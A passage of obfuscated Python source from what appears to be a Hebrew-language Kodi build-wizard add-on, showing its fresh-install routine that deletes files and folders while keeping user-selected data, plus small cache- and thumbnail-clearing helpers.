				elif OOOOOO00OOOOOOOO0 =='MyVideos116.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4893
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4894
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4895
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'skin.Premium.mod'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4896
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4897
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'skin.phenomenal'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4898
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4899
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'skin.titan'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4901
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4902
				elif OOOOOO00OOOOOOOO0 =='sources.xml'and O0O0O00OO0OO00OO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4904
				elif OOOOOO00OOOOOOOO0 =='quicknav.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4907
				elif OOOOOO00OOOOOOOO0 =='x1101.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4908
				elif OOOOOO00OOOOOOOO0 =='b-srtym-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4909
				elif OOOOOO00OOOOOOOO0 =='x1102.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4910
				elif OOOOOO00OOOOOOOO0 =='b-sdrvt-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4911
				elif OOOOOO00OOOOOOOO0 =='x1112.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4912
				elif OOOOOO00OOOOOOOO0 =='b-tlvvyzyh-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4913
				elif OOOOOO00OOOOOOOO0 =='x1111.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4914
				elif OOOOOO00OOOOOOOO0 =='b-tvknyshrly-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4915
				elif OOOOOO00OOOOOOOO0 =='x1110.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4916
				elif OOOOOO00OOOOOOOO0 =='b-yldym-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4917
				elif OOOOOO00OOOOOOOO0 =='x1114.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4918
				elif OOOOOO00OOOOOOOO0 =='b-mvzyqh-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4919
				elif OOOOOO00OOOOOOOO0 =='mainmenu.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4920
				elif OOOOOO00OOOOOOOO0 =='skin.Premium.mod.properties'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4921
				elif OOOOOO00OOOOOOOO0 =='x1122.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4923
				elif OOOOOO00OOOOOOOO0 =='b-spvrt-b.DATA.xml'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4924
				elif OOOOOO00OOOOOOOO0 =='favourites.xml'and O0O0O00OO0OO00OO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4929
				elif OOOOOO00OOOOOOOO0 =='guisettings.xml'and O0O0O00OO0OO00OO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4931
				elif OOOOOO00OOOOOOOO0 =='profiles.xml'and O0O0O00OO0OO00OO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4932
				elif OOOOOO00OOOOOOOO0 =='advancedsettings.xml'and O0O0O00OO0OO00OO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4933
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4934
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'program.apollo'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4935
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4936
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.elementum'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4939
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4940
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4941
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'weather.yahoo'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4942
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.quasar'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4943
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'program.apollo'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4944
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4945
				elif O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4946
				elif OOOOOO00OOOOOOOO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOOO00OOOOOOOO0 ,xbmc .LOGNOTICE )#line:4947
				elif OOOOOO00OOOOOOOO0 .endswith ('.db'):#line:4948
					try :#line:4949
						if OOOOOO00OOOOOOOO0 ==OOO00OOOO0000OOO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOOO00OOOOOOOO0 ,KODIV ),xbmc .LOGNOTICE )#line:4950
						else :os .remove (os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ))#line:4951
					except Exception as OOO0O0OO0OO0OO0O0 :#line:4952
						if not OOOOOO00OOOOOOOO0 .startswith ('Textures13'):#line:4953
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4954
							wiz .log ("-> %s"%(str (OOO0O0OO0OO0OO0O0 )),xbmc .LOGNOTICE )#line:4955
							wiz .purgeDb (os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ))#line:4956
				else :#line:4957
					DP .update (int (wiz .percentage (OOOOOOO0O000OOO0O ,O000O000OO000000O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO00OOOOOOOO0 ),'')#line:4958
					try :os .remove (os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ))#line:4959
					except Exception as OOO0O0OO0OO0OO0O0 :#line:4960
						wiz .log ("Error removing %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4961
						wiz .log ("-> / %s"%(str (OOO0O0OO0OO0OO0O0 )),xbmc .LOGNOTICE )#line:4962
			if DP .iscanceled ():#line:4963
				DP .close ()#line:4964
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4965
				return False #line:4966
		for O0O00O0OO0OO0O0O0 ,OOO00O00OO00OOO0O ,O00000OOOO0O00O0O in os .walk (O000OOO0OOO0OOOOO ,topdown =True ):#line:4967
			OOO00O00OO00OOO0O [:]=[OOOOO0OO00OOO00OO for OOOOO0OO00OOO00OO in OOO00O00OO00OOO0O if OOOOO0OO00OOO00OO not in EXCLUDES ]#line:4968
			for OOOOOO00OOOOOOOO0 in OOO00O00OO00OOO0O :#line:4969
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOO00OOOOOOOO0 ),'')#line:4970
			  if OOOOOO00OOOOOOOO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4971
			   if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4972
			    if not (OOOOOO00OOOOOOOO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4974
			      if not (OOOOOO00OOOOOOOO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4975
			       if not (OOOOOO00OOOOOOOO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4976
			        if not (OOOOOO00OOOOOOOO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4977
			         if not (OOOOOO00OOOOOOOO0 =='program.apollo'and KEEPINFO =='true'):#line:4978
			          if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4979
			           if not (OOOOOO00OOOOOOOO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4980
			            if not (OOOOOO00OOOOOOOO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4981
			             if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4982
			              if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4983
			               if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4984
			                if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4985
			                 if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4986
			                  if not (OOOOOO00OOOOOOOO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4987
			                   if not (OOOOOO00OOOOOOOO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4988
			                    if not (OOOOOO00OOOOOOOO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4989
			                     if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4990
			                       if not (OOOOOO00OOOOOOOO0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4992
			                           if not (OOOOOO00OOOOOOOO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4996
			                            if not (OOOOOO00OOOOOOOO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4997
			                             if not (OOOOOO00OOOOOOOO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4998
			                              if not (OOOOOO00OOOOOOOO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4999
			                               if not (OOOOOO00OOOOOOOO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5000
			                                  shutil .rmtree (os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),ignore_errors =True ,onerror =None )#line:5002
			if DP .iscanceled ():#line:5003
				DP .close ()#line:5004
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5005
				return False #line:5006
		DP .close ()#line:5007
		wiz .clearS ('build')#line:5008
		if over ==True :#line:5009
			return True #line:5010
		elif install =='restore':#line:5011
			return True #line:5012
		elif install :#line:5013
			buildWizard (install ,'normal',over =True )#line:5014
		else :#line:5015
			if INSTALLMETHOD ==1 :OO0OO0O0OOO000O00 =1 #line:5016
			elif INSTALLMETHOD ==2 :OO0OO0O0OOO000O00 =0 #line:5017
			else :OO0OO0O0OOO000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5018
			if OO0OO0O0OOO000O00 ==1 :wiz .reloadFix ('fresh')#line:5019
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5020
	else :#line:5021
		if not install =='restore':#line:5022
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5023
			wiz .refresh ()#line:5024
def clearCache ():#line:5029
		wiz .clearCache ()#line:5030
def fixwizard ():#line:5034
		wiz .fixwizard ()#line:5035
def totalClean ():#line:5037
		wiz .clearCache ()#line:5039
		wiz .clearPackages ('total')#line:5040
		clearThumb ('total')#line:5041
		cleanfornewbuild ()#line:5042
def cleanfornewbuild ():#line:5043
		try :#line:5044
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5045
		except :#line:5046
			pass #line:5047
		try :#line:5048
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5049
		except :#line:5050
			pass #line:5051
		try :#line:5052
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5053
		except :#line:5054
			pass #line:5055
def clearThumb (type =None ):#line:5056
	OO0O00000O0OOO000 =wiz .latestDB ('Textures')#line:5057
	if not type ==None :OO00OO0OO00O0OOO0 =1 #line:5058
	else :OO00OO0OO00O0OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0O00000O0OOO000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5059
	if OO00OO0OO00O0OOO0 ==1 :#line:5060
		try :wiz .removeFile (os .join (DATABASE ,OO0O00000O0OOO000 ))#line:5061
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0O00000O0OOO000 )#line:5062
		wiz .removeFolder (THUMBS )#line:5063
	else :wiz .log ('Clear thumbnames cancelled')#line:5065
	wiz .redoThumbs ()#line:5066
def purgeDb ():#line:5068
	O0O0O0O0OOOO0OO00 =[];OOOO0OOO0O000OO0O =[]#line:5069
	for OOOO0000OOOO0OO00 ,OOOOOOOOO0OOO00OO ,OO00O0OOOOOOO0000 in os .walk (HOME ):#line:5070
		for O0000O0OOOOO00O00 in fnmatch .filter (OO00O0OOOOOOO0000 ,'*.db'):#line:5071
			if O0000O0OOOOO00O00 !='Thumbs.db':#line:5072
				O0OO00000O0OO0O00 =os .path .join (OOOO0000OOOO0OO00 ,O0000O0OOOOO00O00 )#line:5073
				O0O0O0O0OOOO0OO00 .append (O0OO00000O0OO0O00 )#line:5074
